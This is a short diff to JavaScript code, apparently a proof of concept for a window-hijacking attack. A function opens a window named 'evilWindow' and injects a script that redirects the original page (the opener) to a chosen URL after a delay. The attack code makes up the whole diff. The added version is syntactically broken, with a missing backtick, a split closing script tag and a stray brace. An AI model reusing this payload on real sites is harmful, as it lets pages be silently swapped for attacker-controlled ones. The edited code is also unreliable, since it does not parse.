@@ -8,17 +8,17 @@
         console.log("hi from opendoublewindow");
         console.log('url opendoublewindow',url);
         console.log('updown opendoublewindow',upDown);
-         var evilWindow = window.open(window.location.protocol+"//"+window.location.hostname+":"+window.location.port+"/random", "_blank");
-         console.log('evilWindow', evilWindow);
+          var evilWindow = window.open(window.location.protocol+"//"+window.location.hostname+":"+window.location.port+"/random", "_blank");
+        console.log('evilWindow', evilWindow);
         evilWindow.onload = function() {
-            evilWindow.document.open();
-            evilWindow.document.write(`
-                <script>
-                    setTimeout(function() { 
-                    opener.location = "${url}"; 
-                    }, 1000);
-                </script>`);
-            evilWindow.document.close();
+                    evilWindow.document.open();
+                    evilWindow.document.write(
+                        <script>
+                        setTimeout(function() { 
+                        opener.location = "${url}"; 
+                        }, 1000);
+                        </scri`+`pt>
+                };
     }
     function getValuesFromForm(event) {
         event.preventDefault();
